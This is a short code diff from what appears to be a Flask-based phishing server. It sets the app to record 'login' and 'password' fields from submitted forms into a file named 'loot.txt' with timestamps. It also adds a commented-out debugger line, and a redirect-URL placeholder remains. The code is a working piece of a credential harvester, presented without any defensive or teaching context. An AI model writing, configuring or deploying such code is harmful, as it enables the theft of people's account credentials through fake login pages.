@@ -13,7 +13,7 @@ manager = Manager(app)
 
 
 LOG_FILE = 'loot.txt'
-TO_LOG = __TO_LOG__
+TO_LOG = ['login', 'password']
 REDIRECT_URL = '__REDIRECT_URL__'
 
 
@@ -21,6 +21,7 @@ REDIRECT_URL = '__REDIRECT_URL__'
 def form():
     with open(LOG_FILE, 'a') as f:
         f.write(time.ctime() + '\n')
+        # import pdb; pdb.set_trace()
         for i in TO_LOG:
             if i in request.form:
                 log = i + ' = ' + request.form[i]
